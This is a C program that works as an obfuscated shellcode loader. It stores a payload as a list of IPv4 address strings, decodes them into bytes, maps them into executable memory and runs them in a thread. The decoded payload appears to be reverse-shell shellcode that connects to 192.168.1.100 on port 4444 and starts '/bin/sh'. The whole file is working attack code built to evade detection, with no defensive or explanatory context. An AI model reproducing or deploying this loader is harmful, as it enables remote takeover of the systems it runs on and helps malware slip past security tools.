#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>

int decode_ipv4_fuscation(const char* ipv4[], unsigned char* output, int count) {
    struct in_addr addr;
    int offset = 0;

    for (int i = 0; i < count; i++) {
        if (inet_pton(AF_INET, ipv4[i], &addr) != 1) {
            fprintf(stderr, "Failed to convert: %s\n", ipv4[i]);
            return -1;
        }
        memcpy(output + offset, &addr, 4);
        offset += 4;
    }
    return 0;
}

const char* IPv4Shell[] = {
    "106.41.88.153", "106.2.95.106", "1.94.15.5", "72.151.72.185", "2.0.17.92", "192.168.1.100", "81.72.137.230", "106.16.90.106", 
    "42.88.15.5", "106.3.94.72", "255.206.106.33", "88.15.5.117", "246.106.59.88", "153.72.187.47", "98.105.110.47", "115.104.0.83", 
    "72.137.231.82", "87.72.137.230", "15.5.144.144"
};

#define ELEMENTS_COUNT 19
#define SHELLCODE_SIZE 76

int main() {
    unsigned char shellcode[SHELLCODE_SIZE];
    void* exec_mem;
    pthread_t thread;

    printf("[*] Decoding IPv4 shellcode...\n");
    if (decode_ipv4_fuscation(IPv4Shell, shellcode, ELEMENTS_COUNT) != 0) {
        return -1;
    }

    
    exec_mem = mmap(NULL, SHELLCODE_SIZE,
                    PROT_READ | PROT_WRITE | PROT_EXEC,
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (exec_mem == MAP_FAILED) {
        perror("mmap failed");
        return -1;
    }

    memcpy(exec_mem, shellcode, SHELLCODE_SIZE);
    printf("[+] Shellcode at: %p\n", exec_mem);

    
    pthread_create(&thread, NULL, (void*(*)(void*))exec_mem, NULL);
    printf("[+] Press Enter to exit...\n");
    getchar();

    munmap(exec_mem, SHELLCODE_SIZE);
    return 0;
}
